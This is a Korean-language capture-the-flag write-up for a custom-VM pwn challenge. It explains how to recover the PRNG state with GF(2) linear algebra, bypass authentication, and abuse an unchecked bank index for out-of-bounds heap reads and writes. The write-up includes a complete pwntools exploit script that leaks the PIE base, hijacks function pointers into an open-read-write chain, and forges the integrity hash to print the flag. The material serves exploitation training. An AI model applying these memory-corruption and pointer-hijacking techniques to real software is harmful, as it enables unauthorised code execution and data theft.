---
ctf_name: "HACKSIUM BUSAN 2026"
challenge_name: "명륜동"
category: "pwn"
difficulty: "hard"
author: "aswe0810m"
date: "2026-08-08"
points: 100
tags: [custom-vm, prng, gf2-linear-algebra, oob-read-write, orw, seccomp, sbox]
---

# 명륜동

## 문제 설명

> 차세대 스마트 선박의 평형수 관리 시스템(BWMS) 핵심 제어 모듈에 접근했습니다. 제어 모듈은 독자적인 레지스터 기반 VM에서 명령을 처리하며, 세션마다 물리 opcode 배치를 변경합니다. 제조사는 유지보수 모드와 메모리 경계가 완전히 분리되어 있어 VM 외부의 호스트 상태에는 접근할 수 없다고 주장합니다. 진단 프로토콜과 상태 전이의 모순을 찾아 VM 경계를 탈출하고 선박 제어 프로세스의 실행 흐름을 장악하십시오.

- ELF 64-bit, PIE, Full RELRO, Canary, NX enabled, stripped

## 풀이

### 분석

바이너리는 "DeepBlue_BWMS control module v5.0"이라는 커스텀 VM으로, stdin에서 2바이트(16-bit) 명령어를 읽어 처리한다. 명령어 포맷은 상위 4비트가 opcode, 하위 12비트가 operand이다.

VM은 9개의 opcode를 가지며, 상위 4비트와 실제 opcode 사이의 매핑은 세션마다 랜덤 순열로 섞인다. 매 명령어 실행 후 자동으로 RESHUFFLE이 발생하며, unknown opcode를 밟아도 RESHUFFLE이 발생한다. 또한 0xFFFF는 opcode dispatch를 우회하는 특수 진단 명령어로, ARM/AUTH 상태를 안전하게 확인할 수 있다.

초기화 과정에서 S-box(256바이트 치환 테이블)를 deterministic하게 생성하고, /dev/urandom에서 읽은 64바이트를 커스텀 해시 함수로 처리한 뒤 그 결과를 PRNG 시드로 사용한다. 이 PRNG가 opcode 순열, AUTH 코드, READ/WRITE XOR 키 스트림을 전부 결정한다.

힙에 0x240바이트 VM 컨텍스트가 calloc으로 할당되며, 주요 레이아웃은 다음과 같다.

- +0x100: filename buffer (64바이트, open()이 사용)
- +0x140: file descriptor
- +0x148: read buffer (128바이트)
- +0x1C8: bytes_read count
- +0x1D0~0x1EF: 함수 포인터 배열 (최대 4개, 초기값 FUN_2030)
- +0x1F0: pipeline count (초기값 2)
- +0x1F8: integrity hash

9개 opcode는 다음과 같다.

- opcode 0 RESHUFFLE: 순열 테이블 재생성
- opcode 1 ARM: 인증 준비 플래그 설정
- opcode 2 AUTH: 12-bit operand와 기대값 비교, 일치 시 인증 성공
- opcode 3 RESET: ARM 해제 및 데이터 영역 초기화
- opcode 4 SELECT TANK: 메모리 뱅크 선택 (미인증 시 0~15 제한, 인증 시 제한 없음)
- opcode 5 READ: tank×16+offset에서 XOR 후 1바이트 출력
- opcode 6 WRITE: XOR 후 tank×16+offset에 1바이트 기록
- opcode 7 DIAG: "status: nominal" 출력
- opcode 8 EXECUTE PIPELINE: 무결성 해시 검증 후 함수 포인터를 순서대로 호출

seccomp BPF 필터가 설치되어 있으며, 허용되는 syscall은 open, openat, read, write, close, fstat, lseek, mmap, mprotect, munmap, brk, rt_sigreturn, exit, exit_group, newfstatat, getrandom이다. execve는 차단되어 있어 쉘 획득은 불가능하고 ORW(Open-Read-Write)로 플래그를 읽어야 한다.

### 취약점

두 가지 취약점이 결합되어 익스플로잇이 가능하다.

첫째, 0xFFFF 진단 명령어를 통해 내부 PRNG(MT19937 변형)의 16-bit 출력을 수집할 수 있다. 이 PRNG는 XOR, shift, AND(상수)만 사용하는 선형 PRNG이므로, GF(2) 위의 선형 방정식 시스템으로 모델링하여 512-bit 내부 상태를 복원할 수 있다. 상태가 복원되면 opcode 순열, AUTH 코드, XOR 키 스트림을 모두 예측할 수 있으므로 opcode 브루트포싱 없이 정확한 명령어를 전송할 수 있다.

둘째, 인증 후 SELECT TANK에 바운드 체크가 없다. tank 번호가 byte로 저장되어 0~255까지 가능하며, READ/WRITE 접근 주소가 heap_ptr + tank×16 + offset이므로 힙 할당 영역(576바이트)을 넘어서 읽기/쓰기가 가능하다. 함수 포인터 영역(+0x1D0)과 무결성 해시(+0x1F8)에 접근하여 EXECUTE PIPELINE의 실행 흐름을 장악할 수 있다.

### 익스플로잇

공격은 5단계로 구성된다.

1단계: PRNG 상태 복원. 0xFFFF 진단 명령어를 40회 전송하여 PRNG 출력 16비트를 40개 수집한다. 총 640개 방정식, 512개 미지수의 GF(2) 선형 시스템을 SageMath로 풀어 내부 상태(16개 32-bit word)를 복원한다.

2단계: AUTH 우회. 복원된 상태에서 random_hash를 계산하고, 이를 S-box 기반 MAC으로 처리하여 12-bit AUTH 코드를 산출한다. random_hash는 동시에 opcode 순열 PRNG의 초기 시드이므로, 매 명령어 후의 순열 변화를 정확히 추적할 수 있다. ARM → AUTH(코드) 순서로 전송하여 인증을 통과한다.

3단계: PIE base leak. SELECT_TANK(29)로 heap+0x1D0을 가리킨 뒤 READ로 8바이트를 읽으면 초기에 저장된 FUN_2030 함수 포인터의 절대 주소가 나온다. READ는 XOR 암호화가 걸려 있으므로 counter 기반 XOR key를 추적하여 복호화한다. PIE base = leaked_addr - 0x2030.

4단계: ORW 체인 구성. 바이너리 내부에 이미 ORW에 필요한 함수 3개가 존재한다. FUN_1f10은 heap+0x100의 경로로 open하여 fd를 heap+0x140에 저장하고, FUN_1f70은 해당 fd에서 read하여 heap+0x148에 저장하고, FUN_1fd0은 heap+0x148의 내용을 stdout으로 write한다. 세 함수 모두 rdi=heap을 인자로 받으며 endbr64가 있어 CET를 통과한다. WRITE로 다음을 기록한다: heap+0x100에 "/flag\0", heap+0x1D0에 PIE+0x1f10 (open), heap+0x1D8에 PIE+0x1f70 (read), heap+0x1E0에 PIE+0x1fd0 (write), heap+0x1F0에 3 (count).

5단계: 무결성 해시 재계산 및 EXECUTE. EXECUTE는 실행 전 heap[0x100..0x13f] + heap[0x1d0..0x1ef] + heap[0x1f0..0x1f7] 총 0x68바이트를 8라운드 S-box MAC으로 처리한 해시를 검증한다. 이 해시 알고리즘에서 위치 인덱스가 lea edx, [edi+ecx]로 계산되는데 edi=-rsp, ecx=rsp+i이므로 단순히 i+round로 단순화되어 스택 주소와 무관하게 외부에서 계산 가능하다. 재계산한 해시를 heap+0x1F8에 기록한 뒤 EXECUTE를 호출하면 open("/flag") → read → write(stdout)가 순서대로 실행되어 플래그가 출력된다.

```python
from pwn import *
import struct, json, subprocess, time

MASK64 = 0xFFFFFFFFFFFFFFFF

def ROL64(x, n):
    return ((x << n) | (x >> (64 - n))) & MASK64

# S-box + constants
uVar8 = 0
lVar2 = 0x2f
while True:
    uVar8 = (uVar8 * 0x101 + lVar2) & MASK64
    lVar2 += 0x1b
    if lVar2 == 0x107:
        break

DAT_5160 = ROL64(uVar8, 7) | 1
DAT_5168 = ~uVar8 & MASK64
DAT_5170 = uVar8 | 1

uVar3 = uVar8
for _ in range(8):
    uVar3 = ((uVar3 >> 0xb ^ uVar3) * DAT_5170) & MASK64
    temp = (uVar3 >> 0x1d ^ uVar3) & MASK64
    uVar3 = (ROL64(temp, 17) - uVar8 - 1) & MASK64
sbox = list(range(256))
for i in range(255, 0, -1):
    uVar3 = ((uVar3 >> 0xb ^ uVar3) * DAT_5170) & MASK64
    temp = (uVar3 >> 0x1d ^ uVar3) & MASK64
    uVar3 = (ROL64(temp, 17) - uVar8 - 1) & MASK64
    j = ((uVar3 >> 0x1f ^ uVar3) & MASK64) % (i + 1)
    sbox[i], sbox[j] = sbox[j], sbox[i]

def shuffle_prng_step(st):
    v = ((st >> 0xb ^ st) * DAT_5170) & MASK64
    temp = (v >> 0x1d ^ v) & MASK64
    v = (ROL64(temp, 17) + DAT_5168) & MASK64
    return v

def compute_permutation(prng_state):
    ps = prng_state
    fwd = list(range(15))
    for i in range(14, 0, -1):
        ps = shuffle_prng_step(ps)
        r = ((ps >> 0x1f ^ ps) & MASK64) % (i + 1)
        fwd[i], fwd[r] = fwd[r], fwd[i]
    inv = [0xFF] * 16
    for i in range(15):
        inv[fwd[i]] = i
    return fwd, inv, ps

def make_hash(d):
    words = struct.unpack('<16I', d)
    h = 0xd1b54a32d192ed03
    for w in words:
        h = (((h ^ w) >> 0xb ^ h ^ w) * DAT_5170) & MASK64
        temp = (h >> 0x1d ^ h) & MASK64
        h = (ROL64(temp, 17) + DAT_5168) & MASK64
    return h

def auth_code_calc(rh):
    hb = struct.pack('<Q', rh)
    xa, sa = 0, 0
    for i in range(8):
        b = hb[i]
        xa = (xa ^ b) & 0xFF
        xa = sbox[xa]
        sa = (b + i + sa) & 0xFF
        sa = sbox[sa]
    return ((xa << 4) ^ sa) & 0xFFF

def compute_execute_hash(filename_area, func_ptrs_area, count_val):
    buf = bytearray(0x68)
    buf[0x00:0x40] = filename_area[:0x40]
    buf[0x40:0x60] = func_ptrs_area[:0x20]
    buf[0x60:0x68] = struct.pack('<Q', count_val)
    result = 0
    for r in range(8):
        state = (1 + r * 0x1f) & 0xFF
        for i in range(0x68):
            idx = ((i + r) ^ buf[i] ^ state) & 0xFF
            state = sbox[idx]
        result = (result << 8) | state
    return result

NAMES = ['RESHUFFLE','ARM','AUTH','RESET','SELECT_TANK','READ','WRITE','DIAG','EXECUTE']

def get_nibble(inv, opcode_name):
    idx = NAMES.index(opcode_name)
    for n in range(15):
        if inv[n] == idx:
            return n
    return None

# 접속 + PRNG 출력 수집
p = process('./명륜동')
p.recvuntil(b'diagnostics\n')

for i in range(40):
    p.send(p16(0xFFFF, endian='big'))
time.sleep(1)
data = p.recvn(160, timeout=5)

outputs = []
for i in range(0, 160, 4):
    chunk = data[i:i+4]
    outputs.append((chunk[1] << 8) | chunk[0])

# SageMath로 PRNG 상태 복원
with open('/tmp/prng_outputs.json', 'w') as f:
    json.dump(outputs, f)

subprocess.run(['conda', 'run', '-n', 'sage', 'sage', 'solve_prng.sage'], check=True)

with open('/tmp/prng_state.json') as f:
    recovered = json.load(f)

# AUTH 코드 계산 + 순열 추적
random64 = struct.pack('<16I', *recovered)
random_hash = make_hash(random64)
ac = auth_code_calc(random_hash)

prng_state = random_hash
fwd, inv, prng_state = compute_permutation(prng_state)
xor_counter = 0

def send_op(opcode_name, operand=0):
    global prng_state, fwd, inv
    nib = get_nibble(inv, opcode_name)
    val = (nib << 12) | (operand & 0xFFF)
    p.send(p16(val, endian='big'))
    fwd, inv, prng_state = compute_permutation(prng_state)

def compute_xor_key():
    global xor_counter
    val = (DAT_5160 * xor_counter) & MASK64
    val = (val ^ prng_state) & MASK64
    xor_counter += 1
    val = ((val >> 0xb) ^ val) & MASK64
    val = (val * DAT_5170) & MASK64
    temp = (val >> 0x1d ^ val) & MASK64
    val = (ROL64(temp, 17) + DAT_5168) & MASK64
    val = ((val >> 0x1f) ^ val) & MASK64
    return val & 0xFF

def read_byte(offset):
    key = compute_xor_key()
    send_op('READ', offset & 0xF)
    time.sleep(0.05)
    return p.recvn(1, timeout=2)[0] ^ key

def write_byte(offset, value):
    key = compute_xor_key()
    encoded = value ^ key
    operand = ((offset & 0xF) << 8) | (encoded & 0xFF)
    send_op('WRITE', operand)
    time.sleep(0.05)

def write_qword(tank, start_offset, value):
    send_op('SELECT_TANK', tank)
    time.sleep(0.05)
    data = struct.pack('<Q', value)
    for i in range(8):
        write_byte(start_offset + i, data[i])

try:
    p.recv(timeout=0.5)
except:
    pass

# 인증
send_op('ARM')
send_op('AUTH', ac)

# PIE leak
send_op('SELECT_TANK', 29)
time.sleep(0.05)
leak = b''
for i in range(8):
    leak += bytes([read_byte(i)])
func_addr = struct.unpack('<Q', leak)[0]
pie_base = func_addr - 0x2030

# ORW 체인 기록
FUN_OPEN  = pie_base + 0x1f10
FUN_READ  = pie_base + 0x1f70
FUN_WRITE = pie_base + 0x1fd0

FLAG_PATH = b"/flag\x00"
send_op('SELECT_TANK', 16)
time.sleep(0.05)
for i, b in enumerate(FLAG_PATH):
    write_byte(i, b)

write_qword(29, 0, FUN_OPEN)
send_op('SELECT_TANK', 29)
time.sleep(0.05)
for i in range(8):
    write_byte(8 + i, struct.pack('<Q', FUN_READ)[i])

write_qword(30, 0, FUN_WRITE)
write_qword(31, 0, 3)

# 무결성 해시 재계산
filename_area = bytearray(0x40)
filename_area[:len(FLAG_PATH)] = FLAG_PATH
func_ptrs_area = bytearray(0x20)
struct.pack_into('<Q', func_ptrs_area, 0x00, FUN_OPEN)
struct.pack_into('<Q', func_ptrs_area, 0x08, FUN_READ)
struct.pack_into('<Q', func_ptrs_area, 0x10, FUN_WRITE)
execute_hash = compute_execute_hash(filename_area, func_ptrs_area, 3)

send_op('SELECT_TANK', 31)
time.sleep(0.05)
for i in range(8):
    write_byte(8 + i, struct.pack('<Q', execute_hash)[i])

# EXECUTE → flag 출력
send_op('EXECUTE')
time.sleep(0.5)
flag = p.recv(timeout=2)
print(f"FLAG: {flag}")
p.interactive()
```

## 플래그

```
HACKSIUM{...}
```

## 배운 점

libc leak에 고착되어 힙 너머의 libc 포인터를 찾으려 했으나, 바이너리 안에 이미 open/read/write wrapper 함수가 존재하고 EXECUTE PIPELINE이 rdi=heap으로 호출하는 구조를 활용하면 PIE base만으로 ORW 체인을 구성할 수 있었다. 익스플로잇 경로를 설계할 때 "libc를 leak해야 한다"는 고정관념에서 벗어나 바이너리 자체의 기능을 먼저 점검하는 것이 중요하다.

opcode 매핑 브루트포싱은 unknown opcode가 자동 reshuffle을 유발하여 성공 확률이 약 2%에 불과했다. 0xFFFF 진단 명령어로 PRNG 출력을 수집하고 GF(2) 선형대수로 내부 상태를 복원하는 것이 의도된 풀이 경로였다.

Ghidra 디컴파일러가 ROL(rotate left) 명령어를 shift+OR 조합으로 표현하므로, `(x << 17) | (x >> 0x2f)`는 실제로 ROL64(x, 17)이다. 이를 인지하지 못하면 S-box, 해시 함수, PRNG 재구현이 전부 틀어진다.

EXECUTE의 무결성 해시에서 위치 인덱스를 `lea edx, [edi+ecx]`로 계산하는데, edi=-rsp와 ecx=rsp+offset이 상쇄되어 스택 주소와 무관한 순수 데이터 기반 해시가 된다. 디스어셈블리에서 스택 포인터가 등장하더라도 실제 의존성이 있는지 주의 깊게 확인해야 한다.